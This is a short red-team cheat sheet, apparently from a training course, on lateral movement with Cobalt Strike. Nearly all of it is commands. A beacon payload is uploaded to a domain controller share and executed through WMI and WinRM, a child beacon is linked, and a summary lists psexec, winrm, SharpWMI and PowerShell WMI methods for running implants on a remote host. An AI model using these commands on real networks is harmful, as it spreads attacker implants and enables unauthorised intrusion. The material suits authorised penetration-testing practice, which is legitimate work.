To do lateral movement via CobaltStrike see here:
- [[Jump]]
- [[Custom]]
- [[Remote-Exec]]

```beacon
beacon> cd \\dc-2\c$\shares\software
beacon> upload C:\Payloads\beacon.exe
beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon.exe
beacon> remote-exec winrm dc-2 cmd /c C:\Shares\Software\beacon.exe
beacon> link dc-2
[+] established link to child beacon: 10.10.17.71
```


## Summary
```beacon
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv command="C:\Windows\Temp\beacon-http.exe"
jump psexec64 srv smb
jump psexec_psh SRV smb
jump winrm64 srv smb
remote-exec wmi srv C:\Windows\Temp\beacon-http.exe
remote-exec winrm srv cmd /c C:\Windows\Temp\beacon-http.exe
powershell invoke-command -computername srv.child.rto.local -scriptblock {whoami}
powershell ([WMICLASS]"\\srv\ROOT\CIMV2:win32_process").Create('C:\Windows\Temp\beacon-http.exe')
```